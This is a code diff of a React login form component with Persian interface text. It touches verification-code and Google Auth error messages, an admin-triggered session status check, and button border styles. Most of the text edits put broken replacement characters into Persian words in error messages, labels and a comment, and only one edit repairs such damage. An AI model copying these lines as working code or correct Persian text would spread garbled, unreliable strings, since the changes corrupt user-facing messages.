@@ -214,7 +214,7 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        // بررسی دقیق وضعیت ��اربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -493,7 +493,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره ��لاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -580,7 +580,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارس��ل کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارس��ل کد. لط��ا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -1841,7 +1841,7 @@ export const LoginForm = () => {
                             animation: "spin 1s linear infinite",
                           }}
                         />
-                        <span>در ��ال ارسال کد...</span>
+                        <span>در حال ارسال کد...</span>
                       </div>
                     ) : (
                       <span>ثبت و ادام��</span>
@@ -2003,7 +2003,6 @@ export const LoginForm = () => {
                     alignItems: "center",
                     borderBottomLeftRadius: "8px",
                     borderBottomRightRadius: "8px",
-                    borderColor: "rgb(0, 122, 255)",
                     borderRadius: "8px",
                     borderTopLeftRadius: "8px",
                     borderTopRightRadius: "8px",
@@ -2029,7 +2028,7 @@ export const LoginForm = () => {
                     userSelect: "none",
                     verticalAlign: "middle",
                     backgroundColor: "rgba(0, 0, 0, 0)",
-                    border: "1px solid rgb(0, 122, 255)",
+                    border: "none",
                   }}
                 >
                   ویرایش شماره موبایل
@@ -3531,7 +3530,7 @@ export const LoginForm = () => {
                         <span>در حال ار��ال کد...</span>
                       </div>
                     ) : (
-                      "ارسال کد تایید"
+                      "ارسال کد تا��ید"
                     )}
                   </button>
                 </div>
